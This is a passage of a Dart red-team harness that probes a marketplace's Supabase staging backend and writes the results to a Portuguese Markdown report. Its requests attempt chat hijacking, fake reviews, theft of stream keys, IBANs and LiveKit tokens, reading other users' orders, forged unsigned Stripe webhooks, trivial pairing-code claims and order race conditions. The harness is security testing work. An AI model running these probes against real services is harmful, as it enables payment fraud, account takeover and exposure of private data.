  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
  String? freshTok,
  String? freshId,
) async {
  cycles.add('7-identidade');
  note('ciclo identidade');

  final emailRpcB = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/rpc/batata_find_user_id_by_email',
    token: buyerTok,
    body: {'p_email': envHintSellerEmail()},
  );
  probe('id.email.buyer', 'find_user_id_by_email como buyer', {
    'status': emailRpcB.statusCode,
    'body': clip(emailRpcB.body, 200),
  });

  // Chat hijack: create chat me+seller then PATCH user_b to random
  final chat = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/chats',
    token: buyerTok,
    body: {'user_a': buyerId, 'user_b': sellerId},
  );
  probe('id.chat.insert', 'buyer INSERT chat', {
    'status': chat.statusCode,
    'body': clip(chat.body, 300),
  });
  String? cid;
  final cj = tryJson(chat);
  if (cj is List && cj.isNotEmpty) cid = (cj.first as Map)['id']?.toString();
  if (cj is Map) cid = cj['id']?.toString();
  if (cid != null && freshId != null) {
    final hij = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/chats?id=eq.$cid',
      token: buyerTok,
      body: {'user_b': freshId},
    );
    probe('id.chat.hijack', 'PATCH chat user_b → terceiro', {
      'status': hij.statusCode,
      'body': clip(hij.body, 300),
    });
  }

  // Reviews: target other user without order
  if (freshId != null && freshTok != null) {
    final rv = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/reviews',
      token: freshTok,
      body: {
        'target_id': sellerId,
        'buyer_id': freshId,
        'stars': 5,
        'comment': 'unearned',
        'author_role': 'comprador',
        'target_type': 'seller',
      },
    );
    probe('id.review.noorder', 'review sem order', {
      'status': rv.statusCode,
      'body': clip(rv.body, 300),
    });
    if (rv.statusCode < 300) {
      finding(
        id: 'RTB-B-REP-02',
        title: 'Review sem encomenda',
        severity: 'P1',
        actor: 'JWT fresco',
        pre: 'conta nova',
        request: 'POST reviews sem order_id',
        before: {},
        result: clip(rv.body, 300),
        after: {},
        impact: 'Reputação inflacionável.',
        repro: 'JWT qualquer POST reviews.',
      );
    }
  }

  // livekit token for someone else's live
  final anyLive = await c.select('lives', limit: 1);
  if (anyLive.isNotEmpty) {
    final lid = anyLive.first['id'].toString();
    final tok = await edge(
      c,
      'livekit-mux-publish',
      token: buyerTok,
      body: {'step': 'token', 'live_id': lid},
    );
    probe('id.livekit.other', 'buyer pede token LiveKit de live alheia', {
      'live_id': lid,
      'status': tok.statusCode,
      'body': clip(tok.body, 400),
    });
    if (tok.statusCode == 200 && tok.body.contains('token')) {
      finding(
        id: 'RTB-B-AUTH-02',
        title: 'Token LiveKit de directo alheio',
        severity: 'P1',
        actor: 'buyer JWT',
        pre: 'conhecer live_id',
        request: 'POST livekit-mux-publish step=token',
        before: {},
        result: clip(tok.body, 300),
        after: {},
        impact: 'Publicar/interferir no stream de outro vendedor.',
        repro: 'JWT não-dono + live_id alheio.',
      );
    }
    final done = await edge(
      c,
      'complete-mux-live',
      token: buyerTok,
      body: {'live_id': lid},
    );
    probe('id.complete.other', 'buyer complete-mux-live alheio', {
      'status': done.statusCode,
      'body': clip(done.body, 300),
    });
  }
}

String envHintSellerEmail() {
  try {
    final env = loadLiveOpsStagingEnv();
    return env['LIVE_OPS_TEST_SELLER_EMAIL'] ?? 'x@y.z';
  } catch (_) {
    return 'x@y.z';
  }
}

Future<void> cyclePrivacy(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles.add('8-privacidade');
  note('ciclo privacidade');

  final tables = [
    'orders',
    'chats',
    'chat_messages',
    'order_disputes',
    'stripe_checkout_events',
    'ps_ingest_audit',
    'wallet_payout_ledger',
    'fleaber_commissions',
    'live_tips',
    'live_reservation_requests',
    'profiles',
    'lives',
  ];
  for (final t in tables) {
    final r = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/$t?select=*&limit=5',
      token: buyerTok,
    );
    probe('priv.list.$t', 'buyer SELECT * $t limit 5', {
      'status': r.statusCode,
      'bytes': r.body.length,
      'body': clip(r.body, 250),
    });
  }

  // Column fishing on lives
  for (final col in [
    'mux_stream_key',
    'stream_key',
    'mux_live_id',
    'livekit_egress_id',
  ]) {
    final r = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/lives?select=id,$col&limit=1',
      token: buyerTok,
    );
    probe('priv.lives.$col', 'SELECT lives.$col', {
      'status': r.statusCode,
      'body': clip(r.body, 200),
    });
    if (r.statusCode == 200 &&
        r.body.contains(col) &&
        !r.body.contains('permission denied')) {
      final j = tryJson(r);
      if (j is List &&
          j.isNotEmpty &&
          (j.first as Map)[col] != null &&
          '${(j.first as Map)[col]}'.isNotEmpty) {
        finding(
          id: 'RTB-B-PRIV-02',
          title: 'Credencial de stream exposta ($col)',
          severity: 'P1',
          actor: 'buyer JWT',
          pre: 'lives existentes',
          request: 'GET /lives?select=$col',
          before: {},
          result: clip(r.body, 300),
          after: {},
          impact: 'Hijack de ingest Mux/LiveKit.',
          repro: 'SELECT da coluna secreta com JWT.',
        );
      }
    }
  }

  for (final col in ['iban', 'mb_way', 'phone', 'legal_full_name', 'email']) {
    final r = await rest(
      c,
      method: 'GET',
      path: '/rest/v1/profiles?select=id,$col&limit=3',
      token: buyerTok,
    );
    probe('priv.profiles.$col', 'SELECT profiles.$col', {
      'status': r.statusCode,
      'body': clip(r.body, 250),
    });
  }

  // Storage list
  for (final bucket in ['chat-media', 'fleaber-private', 'product_media']) {
    final r = await http.post(
      Uri.parse('${c.url}/storage/v1/object/list/$bucket'),
      headers: {
        'apikey': c.anonKey,
        'Authorization': 'Bearer $buyerTok',
        'Content-Type': 'application/json',
      },
      body: jsonEncode({'prefix': '', 'limit': 20}),
    );
    probe('priv.storage.$bucket', 'storage list $bucket', {
      'status': r.statusCode,
      'body': clip(r.body, 300),
    });
  }

  // UUID oracle: other people's orders
  final allOrders = await c.select('orders', limit: 8);
  if (allOrders.isNotEmpty) {
    final foreign = allOrders.where(
      (o) => o['buyer_id'] != buyerId && o['seller_id'] != buyerId,
    );
    for (final o in foreign.take(3)) {
      final id = o['id'];
      final r = await rest(
        c,
        method: 'GET',
        path: '/rest/v1/orders?id=eq.$id&select=*',
        token: buyerTok,
      );
      probe('priv.order.uuid', 'buyer GET order alheia $id', {
        'status': r.statusCode,
        'body': clip(r.body, 250),
      });
      if (r.statusCode == 200 && r.body.length > 5 && r.body != '[]') {
        finding(
          id: 'RTB-B-PRIV-03',
          title: 'Order alheia legível por UUID',
          severity: 'P1',
          actor: 'buyer JWT',
          pre: 'UUID de order onde o actor não é parte',
          request: 'GET /orders?id=eq.<uuid>',
          before: {},
          result: clip(r.body, 400),
          after: {},
          impact: 'Cross-user: preços, moradas, estados, IDs Stripe.',
          repro: 'Enumerar UUID conhecido.',
        );
      }
    }
  }
}

Future<void> cycleStock(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles.add('stock');
  note('ciclo stock');

  final prod = await fixtureProduct(c, sellerId, qty: 1, title: 'RTB-B stock1');
  if (prod == null) return;
  final pid = prod['id'].toString();

  // Two concurrent orders qty=1
  final a = rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'pendente',
      'price_total': 4.20,
      'quantity': 1,
      'payment_method': 'mbway',
    },
  );
  final b = rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: sellerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'pendente',
      'price_total': 4.20,
      'quantity': 1,
      'payment_method': 'mbway',
    },
  );
  final rs = await Future.wait([a, b]);
  probe('stock.dual.insert', 'duas orders simultâneas stock=1', {
    'a': rs[0].statusCode,
    'b': rs[1].statusCode,
    'abody': clip(rs[0].body, 200),
    'bbody': clip(rs[1].body, 200),
  });

  String? oid(http.Response r) {
    final j = tryJson(r);
    if (j is List && j.isNotEmpty) return (j.first as Map)['id']?.toString();
    if (j is Map) return j['id']?.toString();
    return null;
  }

  final o1 = oid(rs[0]);
  final o2 = oid(rs[1]);
  if (o1 != null && o2 != null && o1 != o2) {
    final p1 = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$o1',
      token: sellerTok,
      body: {'status': 'pago'},
    );
    final p2 = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$o2',
      token: sellerTok,
      body: {'status': 'pago'},
    );
    final after1 = await c.select('orders', filter: 'id=eq.$o1', limit: 1);
    final after2 = await c.select('orders', filter: 'id=eq.$o2', limit: 1);
    final prodAfter = await c.select('products', filter: 'id=eq.$pid', limit: 1);
    probe('stock.dual.pago', 'duas orders → pago no mesmo sku=1', {
      'p1': p1.statusCode,
      'p2': p2.statusCode,
      's1': after1.isEmpty ? null : after1.first['status'],
      's2': after2.isEmpty ? null : after2.first['status'],
      'product': prodAfter,
    });
    final paid = [
      if (after1.isNotEmpty) '${after1.first['status']}',
      if (after2.isNotEmpty) '${after2.first['status']}',
    ].where((s) => s.toLowerCase() == 'pago').length;
    if (paid >= 2) {
      finding(
        id: 'RTB-B-STK-01',
        title: 'Duas orders pagas permanentes no mesmo stock=1 (MB WAY)',
        severity: 'P0',
        actor: 'seller JWT (após duas INSERT)',
        pre: 'produto quantity=1',
        request: 'duas PATCH status=pago',
        before: {'qty': 1},
        result: {'paid_count': paid, 'p1': after1, 'p2': after2},
        after: prodAfter,
        impact: 'Oversell válido: duas vendas económicas no mesmo artigo único.',
        repro: 'Duas orders pendentes + seller marca ambas pago (off-platform).',
      );
    }
  }

  // Reservation insert accepted as buyer
  final lives = await c.select('lives', filter: 'seller_id=eq.$sellerId', limit: 1);
  if (lives.isNotEmpty) {
    final liveId = lives.first['id'];
    final items = await c.select(
      'live_items',
      filter: 'live_id=eq.$liveId',
      limit: 1,
    );
    if (items.isNotEmpty) {
      final iid = items.first['id'];
      final acc = await rest(
        c,
        method: 'POST',
        path: '/rest/v1/live_reservation_requests',
        token: buyerTok,
        body: {
          'live_id': liveId,
          'live_item_id': iid,
          'seller_id': sellerId,
          'buyer_id': buyerId,
          'requested_qty': 1,
          'status': 'accepted',
        },
      );
      probe('stock.res.accepted', 'buyer INSERT reservation status=accepted', {
        'status': acc.statusCode,
        'body': clip(acc.body, 400),
      });
    }
  }
}

Future<void> cycleEdges(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles.add('edges');
  note('ciclo fronteiras Edge');

  final edges = [
    'stripe-webhook',
    'delete-test-account',
    'send-sms-bulkgate',
    'meta-data-deletion',
    'ps-pairing-claim',
    'ps-heartbeat',
    'ps-panel-log',
    'ingest-ocr-reservation',
    'create-mux-live',
    'resolve-mux-playback',
    'sec-fase2-e2e-oversell',
    'livekit-egress-cleanup',
  ];
  for (final fn in edges) {
    final r = await edge(
      c,
      fn,
      token: buyerTok,
      body: {
        'live_id': '00000000-0000-0000-0000-000000000001',
        'code': '000000',
        'device_id': 'rtb-b',
        'confirm': 'APAGAR TUDO',
        'title': 'abc',
      },
    );
    probe('edge.$fn', 'POST $fn JWT buyer payload hostil mínimo', {
      'status': r.statusCode,
      'body': clip(r.body, 280),
    });
  }

  final claim = await edge(
    c,
    'ps-pairing-claim',
    token: c.anonKey,
    body: {'code': '123456', 'device_id': 'rtb-b'},
  );
  probe('edge.claim.anon', 'pairing claim anon 123456', {
    'status': claim.statusCode,
    'body': clip(claim.body, 400),
  });
  if (claim.statusCode == 200 && claim.body.contains('device_token')) {
    finding(
      id: 'RTB-B-AUTH-03',
      title: 'Pairing PS claimável com código trivial',
      severity: 'P1',
      actor: 'anon',
      pre: 'código 123456 eventualmente activo',
      request: 'POST ps-pairing-claim {code:123456}',
      before: {},
      result: clip(claim.body, 400),
      after: {},
      impact: 'Ingest OCR / reservas no directo do vendedor.',
      repro: 'POST claim com códigos comuns.',
    );
  }

  final wh = await http.post(
    Uri.parse('${c.url}/functions/v1/stripe-webhook'),
    headers: {
      'apikey': c.anonKey,
      'Authorization': 'Bearer ${c.anonKey}',
      'Content-Type': 'application/json',
    },
    body: jsonEncode({
      'type': 'checkout.session.completed',
      'data': {
        'object': {'id': 'cs_test_x', 'payment_status': 'paid'},
      },
    }),
  );
  probe('edge.webhook.unsigned', 'stripe-webhook sem assinatura', {
    'status': wh.statusCode,
    'body': clip(wh.body, 250),
  });
  if (wh.statusCode == 200) {
    finding(
      id: 'RTB-B-FIN-05',
      title: 'Webhook Stripe aceita evento sem assinatura',
      severity: 'P0',
      actor: 'anon',
      pre: 'URL da função conhecida',
      request: 'POST stripe-webhook JSON forged',
      before: {},
      result: clip(wh.body, 300),
      after: {},
      impact: 'Settle falso / marcar pago sem pagamento.',
      repro: 'POST sem stripe-signature.',
    );
  }

  final settle = await edge(
    c,
    'create-payment-intent',
    method: 'GET',
    token: c.anonKey,
    query: '?checkout_return=success&session_id=cs_test_forged',
  );
  probe('edge.settle.forged', 'GET settle session_id forjado', {
    'status': settle.statusCode,
    'body': clip(settle.body, 300),
  });

  final mux = await edge(
    c,
    'create-mux-live',
    token: buyerTok,
    body: {'title': 'rtb-b hijack stream'},
  );
  probe('edge.mux.buyer', 'create-mux-live como buyer', {
    'status': mux.statusCode,
    'body': clip(mux.body, 400),
  });
  if (mux.statusCode == 200 && mux.body.contains('stream_key')) {
    finding(
      id: 'RTB-B-AUTH-04',
      title: 'Buyer cria stream Mux',
      severity: 'P2',
      actor: 'buyer JWT',
      pre: 'perfil comprador',
      request: 'POST create-mux-live',
      before: {},
      result: clip(mux.body, 300),
      after: {},
      impact: 'Quota Mux / impersonação de vendedor no ingest.',
      repro: 'JWT buyer POST create-mux-live.',
    );
  }
}

Future<void> cycleRaces(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles.add('5-races');
  note('ciclo races');

  final prod = await fixtureProduct(c, sellerId, qty: 1, title: 'RTB-B race');
  if (prod == null) return;
  final pid = prod['id'].toString();
  final ins = await rest(
    c,
    method: 'POST',
    path: '/rest/v1/orders',
    token: buyerTok,
    body: {
      'buyer_id': buyerId,
      'seller_id': sellerId,
      'product_id': pid,
      'status': 'pendente',
      'price_total': 4.20,
      'quantity': 1,
      'payment_method': 'mbway',
    },
  );
  String? oid;
  final j = tryJson(ins);
  if (j is List && j.isNotEmpty) oid = (j.first as Map)['id']?.toString();
  if (j is Map) oid = j['id']?.toString();
  if (oid == null) return;

  final burst = await Future.wait(List.generate(
    8,
    (_) => rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$oid',
      token: sellerTok,
      body: {'status': 'pago'},
    ),
  ));
  probe('race.pago.burst', '8× PATCH pago simultâneo', {
    'codes': burst.map((e) => e.statusCode).toList(),
  });

  final mixed = await Future.wait([
    rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$oid',
      token: sellerTok,
      body: {'status': 'pago'},
    ),
    rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.$oid',
      token: buyerTok,
      body: {'status': 'cancelado'},
    ),
    rest(
      c,
      method: 'POST',
      path: '/rest/v1/rpc/batata_release_seller_wallet_for_order',
      token: buyerTok,
      body: {'p_order_id': oid},
    ),
    edge(c, 'refund-order', token: sellerTok, body: {'order_id': oid}),
  ]);
  final finalRow = await c.select('orders', filter: 'id=eq.$oid', limit: 1);
  probe('race.mixed.ops', 'pago || cancel || release || refund', {
    'codes': mixed.map((e) => e.statusCode).toList(),
    'bodies': mixed.map((e) => clip(e.body, 120)).toList(),
    'final': finalRow,
  });
}

Future<void> cycleTemporalReputation(
  LiveOpsStagingClient c,
  String buyerTok,
  String sellerTok,
  String buyerId,
  String sellerId,
) async {
  cycles.add('6-estados-reputacao');
  note('ciclo estados / reputação');

  // Existing paid orders: try review after refunded/cancelled
  final paid = await c.select(
    'orders',
    filter: 'buyer_id=eq.$buyerId&status=eq.devolvida',
    limit: 3,
  );
  for (final o in paid) {
    final rv = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/reviews',
      token: buyerTok,
      body: {
        'order_id': o['id'],
        'target_id': o['seller_id'],
        'buyer_id': buyerId,
        'stars': 1,
        'comment': 'after-refund',
        'author_role': 'comprador',
        'target_type': 'seller',
      },
    );
    probe('tmp.review.devolvida', 'review após devolvida', {
      'order': o['id'],
      'status': rv.statusCode,
      'body': clip(rv.body, 250),
    });
  }

  // Resurrect cancelado → pendente
  final cancelled = await c.select(
    'orders',
    filter: 'buyer_id=eq.$buyerId&status=eq.cancelado',
    limit: 2,
  );
  for (final o in cancelled) {
    final r = await rest(
      c,
      method: 'PATCH',
      path: '/rest/v1/orders?id=eq.${o['id']}',
      token: buyerTok,
      body: {'status': 'pendente'},
    );
    probe('tmp.resurrect', 'ressuscitar cancelado→pendente', {
      'order': o['id'],
      'status': r.statusCode,
      'body': clip(r.body, 200),
    });
  }

  // Offers: buyer offer then accept as buyer
  final prod = await fixtureProduct(c, sellerId, title: 'RTB-B offer');
  if (prod != null) {
    final off = await rest(
      c,
      method: 'POST',
      path: '/rest/v1/product_offers',
      token: buyerTok,
      body: {
        'product_id': prod['id'],
        'buyer_id': buyerId,
        'seller_id': sellerId,
        'amount': 1,
        'offered_by': 'buyer',
        'status': 'pending',
      },
    );
    probe('tmp.offer.insert', 'INSERT product_offers', {
      'status': off.statusCode,
      'body': clip(off.body, 300),
    });
    final oj = tryJson(off);
    String? id;
    if (oj is List && oj.isNotEmpty) id = (oj.first as Map)['id']?.toString();
    if (oj is Map) id = oj['id']?.toString();
    if (id != null) {
      final acc = await rest(
        c,
        method: 'PATCH',
        path: '/rest/v1/product_offers?id=eq.$id',
        token: buyerTok,
        body: {'status': 'accepted'},
      );
      probe('tmp.offer.selfaccept', 'buyer aceita a própria oferta', {
        'status': acc.statusCode,
        'body': clip(acc.body, 250),
      });
    }
  }
}

Future<void> cleanup(
  LiveOpsStagingClient c,
  String buyerId,
  String sellerId,
) async {
  try {
    await c.deleteWhere('products', 'title=like.RTB-B%20$stamp*');
  } catch (_) {}
  try {
    await c.deleteWhere('reviews', 'comment=like.rtb-b%');
  } catch (_) {}
}

String renderMd() {
  final p0 = findings.where((f) => f['severity'] == 'P0').length;
  final p1 = findings.where((f) => f['severity'] == 'P1').length;
  final p2 = findings.where((f) => f['severity'] == 'P2').length;
  final buf = StringBuffer();
  buf.writeln('# RED TEAM CEGO B — $stamp');
  buf.writeln();
  buf.writeln('**FROZEN_AT:** ${recon['frozen_at']}');
  buf.writeln('**Ambiente:** staging Supabase `$stagingRef`');
  buf.writeln('**Stripe:** TEST apenas');
  buf.writeln('**Produção tocada:** NÃO');
  buf.writeln('**Fase 4:** NÃO');
  buf.writeln();
  buf.writeln('## Mapa de ataque (reconhecimento próprio)');
  buf.writeln();
  buf.writeln('- OpenAPI anon HTTP ${recon['openapi_anon']}, service ${recon['openapi_service']}, paths ${recon['rest_paths']}');
  buf.writeln('- RPCs observadas: ${(recon['rpc_paths'] as List?)?.length ?? 0}');
  buf.writeln('- Ciclos: ${cycles.join(', ')}');
  buf.writeln();
  buf.writeln('## Findings P0/P1');
  buf.writeln();
  for (final f in findings.where((x) => x['severity'] == 'P0' || x['severity'] == 'P1')) {
    buf.writeln('### ${f['id']} — ${f['title']} (${f['severity']})');
    buf.writeln();
    buf.writeln('- **Actor:** ${f['actor']}');
    buf.writeln('- **Pré-condições:** ${f['preconditions']}');
    buf.writeln('- **Request:** `${f['request']}`');
    buf.writeln('- **Impacto:** ${f['impact']}');
    buf.writeln('- **Reprodução:** ${f['reproduction']}');
    buf.writeln();
  }
  if (p0 + p1 == 0) {
    buf.writeln('_Nenhum P0/P1 comprovado neste freeze._');
    buf.writeln();
  }
  buf.writeln('## P2');
  for (final f in findings.where((x) => x['severity'] == 'P2')) {
    buf.writeln('- **${f['id']}** ${f['title']} — ${f['impact']}');
  }
  buf.writeln();
  buf.writeln('## Lacunas');
  for (final g in gaps) {
    buf.writeln('- $g');
  }
  buf.writeln();
  buf.writeln('## Saturação');
  buf.writeln();
  buf.writeln('Último ciclo completo: `${cycles.isEmpty ? '?' : cycles.last}`');
  buf.writeln();
  buf.writeln('## Veredicto (contagens)');
  buf.writeln();
  buf.writeln('- P0: $p0');
  buf.writeln('- P1: $p1');
  buf.writeln('- P2: $p2');
  buf.writeln('- probes: ${probes.length}');
  buf.writeln();
  return buf.toString();
}
